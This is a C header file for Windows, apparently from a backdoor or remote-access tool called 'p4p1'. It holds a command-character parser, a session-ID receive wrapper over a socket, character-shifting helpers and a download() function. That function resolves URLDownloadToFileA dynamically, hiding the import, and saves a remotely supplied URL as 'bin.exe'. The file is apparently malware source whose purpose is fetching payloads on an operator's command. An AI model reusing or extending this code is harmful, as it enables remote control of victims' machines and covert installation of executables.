/*      _ _       _
 * _ __| | | _ __/ |
 * | '_ \_  _| '_\  |
 * | .__/ |_|| .__/_|
 * |_|       |_|
 *
 * Header file.
 *
 ******/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>

#define str(a) #a
#define xstr(a) str(a)
#define BUFSIZE 9999

typedef HRESULT (WINAPI *UDTF)(LPVOID, LPCTSTR, LPCTSTR, DWORD, LPVOID);

/*
 * get buf and check if p4p1 custom command
 */
int iscommand(char buf)
{
	if(buf == '*'){
		return 1;
	} else if(buf == '&') {
		return 2;
	} else {
		return 0;
	}
}

int download(char * url)
{
	char path[100] = "bin.exe";
	int r = 1;
	HMODULE hDll;
	UDTF URLDownloadToFile;


	if((hDll = LoadLibrary("urlmon"))) {
		if((URLDownloadToFile = (UDTF)GetProcAddress(hDll, "URLDownloadToFileA"))) {
			if(URLDownloadToFile(0, url, path, 0, 0) == 0)
				r = 0;
	}
		FreeLibrary(hDll);
	}

	return r;
}

/*
 * wrapper for recv the sessionid
 */

char wrecvsid(int sock, int size, int *br)
{
	int pbr = *(int *)br;
	char buf[size];
	pbr = SOCKET_ERROR;
	while(pbr == SOCKET_ERROR){
		pbr = recv(sock, buf, size, 0);
			if(pbr == 0 || pbr == WSAECONNRESET){
				break;
			}

			if(pbr < 0){
				return -1;
			} else {
				return buf[0];
			}
	}

}

char incr(char ch)
{
	return ch+1;
}

char decr(char ch)
{
	return ch-1;
}
